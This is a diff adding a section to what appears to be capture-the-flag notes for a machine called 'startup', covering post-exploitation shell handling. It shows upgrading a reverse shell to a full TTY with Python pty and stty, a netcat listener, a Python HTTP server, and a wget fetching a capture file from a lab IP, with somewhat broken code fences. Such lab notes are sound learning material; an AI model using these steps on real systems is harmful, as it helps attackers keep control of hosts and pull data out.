@@ -765,6 +765,33 @@ run
 
 </details>
 
+## Getting a proper TTYPermalink
+Now lets get a proper shell with auto completion.
+
+```console
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+
+Hit CRTL+z to background the current process and on local box type
+```console
+$:~ stty raw -echo
+and type fg and hit enter twice and on the reverse shell export the TERM as xterm.
+```
+www-data@startup:/var/www/html/files/ftp$  export TERM=xterm
+Now we have a proper shell.
+
+### Reverse shell nc
+```console
+nc -nlvp 1234
+```
+
+```console
+python3 -m http.server
+```
+```console
+wget 10.10.169.81:8000/suspicious.pcapng (wget remote IP:port/filename)
+```
+
 ### FILE search
 FILE search
 -> find / -name Flag.txt 2>/dev/null
